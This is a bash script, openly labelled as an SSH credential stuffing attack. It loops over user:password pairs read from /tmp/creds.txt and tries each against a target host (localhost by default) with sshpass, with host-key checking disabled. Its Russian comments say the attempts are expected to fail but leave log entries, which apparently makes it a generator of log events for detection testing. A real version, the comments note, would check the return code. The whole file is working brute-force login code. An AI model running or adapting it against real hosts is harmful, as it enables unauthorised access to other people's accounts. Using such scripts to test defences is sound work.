#!/bin/bash
TARGET_HOST=${TARGET_HOST:-localhost}

echo "[*] Starting SSH credential stuffing attack against $TARGET_HOST"

if ! command -v sshpass &> /dev/null
then
    echo "[-] sshpass could not be found. Aborting."
    exit 1
fi

for cred in $(cat /tmp/creds.txt); do
    USER=$(echo "$cred" | cut -d':' -f1)
    PASS=$(echo "$cred" | cut -d':' -f2)
    
    echo "[*] Trying credentials: $USER:$PASS"
    
    # Пытаемся выполнить простую команду 'whoami' на удаленном хосте
    # Опции SSH подавляют большинство интерактивных запросов
    # Мы ожидаем, что атака будет неудачной, но лог о попытке останется
    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "${USER}@${TARGET_HOST}" whoami &>/dev/null
    
    # В реальном сценарии здесь была бы проверка кода возврата
    
    sleep 1
done

echo "[*] Attack finished."
